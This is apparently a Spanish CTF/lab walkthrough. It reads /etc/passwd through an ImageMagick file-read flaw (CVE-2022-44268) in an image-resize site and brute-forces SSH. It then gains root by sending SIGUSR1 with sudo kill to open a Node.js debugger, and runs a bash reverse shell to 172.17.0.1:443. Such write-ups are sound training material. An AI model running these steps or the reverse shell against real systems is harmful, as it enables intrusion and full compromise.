Hacemos el escaneo de puertos con nmap:
![[Pasted image 20240804203945.png]]
Dentro del puerto 80 tenemos una web para redimensionar imágenes:
![[Pasted image 20240804204056.png]]
La probamos y funciona bien:
![[Pasted image 20240804204134.png]]
Hacemos fuzzing web y vemos dos archivos php:
![[Pasted image 20240804204232.png]]
Visualizamos el info.php:
![[Pasted image 20240804204247.png]]
Y por aquí vemos algo de imagick en su versión 6.9.7-4:
![[Pasted image 20240804204436.png]]
Si investigamos por internet esta versión de imagemagick, vemos que es vulnerable a un arbitrary file read:
```bash
https://www.exploit-db.com/exploits/51261
https://github.com/voidz0r/CVE-2022-44268
```
Para explotar esto, vamos a incrustar un comando dentro de la imagen usando pngcrush:
```bash
pngcrush -text a "profile" "/etc/passwd" wallpaper.png
```
![[Pasted image 20240804205244.png]]
Y esto nos habrá devuelto un archivo llamado pngout.png que podremos analizar y comprobamos que el comando se ha insertado correctamente:
![[Pasted image 20240804205321.png]]
Lo cargamos:
![[Pasted image 20240804205346.png]]
Nos descargamos la imagen y la analizamos con identify:
```bash
identify -verbose resultado.png
```
![[Pasted image 20240804205632.png]]
Y ahora, siguiendo las instrucciones del siguiente repositorio, tenemos que convertir esta información de hexadecimal a string:
```bash
https://github.com/voidz0r/CVE-2022-44268
```
![[Pasted image 20240804205750.png]]
También podemos convertir esto a string usando chatgpt diciendo que nos convierta esa información de hexadecimal a string:
![[Pasted image 20240804210051.png]]
Hacemos fuerza bruta por ssh y funciona:
![[image-11.png]]
![[Pasted image 20240804210131.png]]
Una vez dentro, vemos que podemos ejecutar kill como root:
![[Pasted image 20240804210158.png]]
Y viendo procesos ejecutándose en segundo plano, vemos que hay un archivo javascript que se levanta automáticamente:
![[Pasted image 20240804210250.png]]
Si ejecutamos el siguiente comando podemos ver si hay algún puerto escuchando:
```bash
netstat -ano | grep LISTEN
```
![[Pasted image 20240805091938.png]]
Por tanto, con curl vamos a visualizar lo que nos encontramos por el puerto 8000:
![[Pasted image 20240805092040.png]]
Como podemos matar cualquier proceso miramos de abrir el debuger de node.js enviando una señal `SIGUSR1` al proceso de node.js. Esto deberia abrir el puerto de deug mediante websockets para la aplicación de node.js. Por lo que primero confirmamos que el PID de node sea accesible:
```bash
ps aux | grep node | grep root | awk '{print $2}'
```
![[Pasted image 20240805092343.png]]
Y ahora vamos a comprobar si hay otro puerto abierto:
```bash
sudo /bin/kill -s SIGUSR1 $(ps aux | grep node | grep root | awk '{print $2}')
```
![[Pasted image 20240805092429.png]]
Ahora entraremos con el inspector de node a dicho puerto, el puerto 9229 es utilizado por Node.js para habilitar y acceder al modo de depuración (debugging):
```bash
node inspect 127.0.0.1:9229
```
![[Pasted image 20240805092523.png]]
Y dentro de esta consola, ejecutaremos el siguiente comando:
```bash
exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1\"')")
```
![[Pasted image 20240805092658.png]]
Y habremos recibido la shell como root:
![[Pasted image 20240805092800.png]]
